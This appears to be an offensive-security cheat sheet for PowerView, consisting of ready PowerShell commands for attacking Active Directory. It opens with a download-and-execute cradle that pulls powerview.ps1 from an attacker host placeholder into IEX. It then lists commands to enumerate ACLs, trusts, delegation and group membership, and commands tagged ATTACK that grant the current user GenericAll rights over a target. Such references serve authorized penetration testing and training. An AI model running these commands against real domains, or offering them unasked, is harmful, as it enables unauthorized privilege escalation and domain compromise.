# powerview

% ad, windows, powerview

## load from remote
#platform/windows #target/remote  #cat/RECON 

https://github.com/PowerShellMafia/PowerSploit/

```powershell
(new-object system.net.webclient).downloadstring('http://<lhost>/powerview.ps1') | IEX
```

## Get User from SID
#platform/windows #target/remote  #cat/RECON 
```powershell
ConvertFrom-SID <sid>
```

## Find user ACL 
#platform/windows #target/remote  #cat/RECON 
```powershell
Get-ObjectAcl -Identity <user> -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_}
```

## Find all domain user ACL
#platform/windows #target/remote  #cat/RECON 
```powershell
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

## Add user DACL
#platform/windows #target/remote  #cat/ATTACK
```powershell
Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <current_user> -Rights All
```

## Find all groups our current user got access
#platform/windows #target/remote  #cat/RECON 
```powershell
Get-DomainGroup | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```

## Find all users our current user got access
#platform/windows #target/remote  #cat/RECON 
```powershell
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")) {$_}}
```


## Add GenericAll to target for user
#platform/windows #target/remote  #cat/ATTACK/EXPLOIT 
```powerview
Add-DomainObjectAcl -TargetIdentity <target> -PrincipalIdentity <user> -Rights All
```

## Find all Computer with unconstrained delegation
#platform/windows #target/remote  #cat/RECON 
```powershell
Get-DomainComputer -Unconstrained
```

## Get all domain trust 
#platform/windows #target/remote  #cat/RECON 
```powershell
Get-DomainTrustMapping
```

## Get group member
```powershell
Get-DomainGroupMember -Identity "<group|Administrators>" -Domain <domain>
```

